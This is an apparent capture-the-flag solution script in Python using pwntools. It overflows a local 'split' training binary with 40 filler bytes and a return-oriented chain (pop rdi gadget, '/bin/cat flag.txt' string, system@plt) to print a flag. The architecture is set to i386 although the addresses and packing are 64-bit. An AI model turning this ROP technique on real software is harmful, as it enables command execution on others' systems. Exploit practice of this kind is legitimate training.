#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='i386')
exe = './split'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================


# 0x00601060 /bin/cat/ flag.txt
# 0x00000000004007c3: pop rdi; ret;
# 0x400560 <system@plt>
io = start()

pop_rdi = p64(0x004007c3)
cat_flag = p64(0x00601060)
system = p64(0x00400560)
ret = p64(0x000000000040053e)
payload = b"A"*40 + pop_rdi + cat_flag + ret + system

print(payload)

io.sendline(payload)

io.interactive()

